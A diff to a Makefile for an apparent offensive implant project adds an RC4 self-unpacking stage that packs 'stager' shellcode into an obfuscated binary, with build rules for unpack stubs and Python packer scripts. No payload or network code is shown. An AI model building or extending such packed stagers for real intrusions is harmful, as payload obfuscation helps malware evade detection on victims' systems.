@@ -53,7 +53,21 @@ STAGE0_TARGET = stager
 SHELLCODE = stager.bin
 SHARED_LIB = stager.so
 
-.PHONY: all raw executable executable-target so clean
+# Self-unpacking (pluggable, mirrors the transport interface). Each unpacker
+# has a stub (unpack_stub_<name>.c) and a matching packer (pack_<name>.py).
+UNPACKER ?= rc4
+ifeq ($(UNPACKER),rc4)
+  UNPACK_SRCS = unpack_stub_rc4.c rc4.c
+else
+  UNPACK_SRCS = unpack_stub_$(UNPACKER).c
+endif
+PACK_SCRIPT = pack_$(UNPACKER).py
+
+STUB_ELF = unpack_stub.elf
+STUB_BIN = unpack_stub.bin
+PACKED = stager-packed.bin
+
+.PHONY: all raw executable executable-target so packed clean
 
 # Default target generates raw shellcode (.bin)
 all: raw
@@ -84,6 +98,27 @@ $(SHARED_LIB): $(STAGE0_SRCS)
 	@echo "[+] Exported symbols in $(SHARED_LIB):"
 	@nm -D $@ 2>/dev/null | grep ' [T|g] ' || nm $@ 2>/dev/null | grep ' [T|g] ' || readelf -W -s $@ 2>/dev/null | grep ' FUNC ' || true
 
+# 4. Packed self-unpacking shellcode
+packed: $(PACKED)
+
+$(STUB_ELF): $(UNPACK_SRCS) unpack_stub.ld
+	$(CC) $(COMMON_CFLAGS) -static -Wl,--gc-sections -Wl,-N -Wl,--build-id=none -Wl,-e,_start -Wl,-T,unpack_stub.ld -o $@ $(UNPACK_SRCS)
+
+# Extract the stub as a single flat binary, preserving the vaddr layout
+# (including alignment padding between sections).  The old approach of
+# extracting each section individually with -j and concatenating with cat
+# silently dropped inter-section alignment gaps, which corrupted the .data
+# header offset when .rodata was absent or differently-sized.
+$(STUB_BIN): $(STUB_ELF)
+	objcopy -O binary $(STUB_ELF) $@
+
+$(PACKED): $(SHELLCODE) $(STUB_BIN) $(STUB_ELF)
+	python3 $(PACK_SCRIPT) $(STUB_BIN) $(STUB_ELF) $(SHELLCODE) $(PACKED)
+	@echo "Packed ($(UNPACKER)) shellcode generated at $(PWD)/$(PACKED)"
+	@echo "unpacked: $$(wc -c < $(SHELLCODE)) bytes"
+	@echo "packed:   $$(wc -c < $(PACKED)) bytes"
+
 clean:
 	rm -f $(STAGE0_TARGET) $(SHELLCODE) $(SHARED_LIB) \
+		$(STUB_ELF) $(STUB_BIN) $(PACKED) \
 		downloader downloader.bin downloader_blob.h *.o
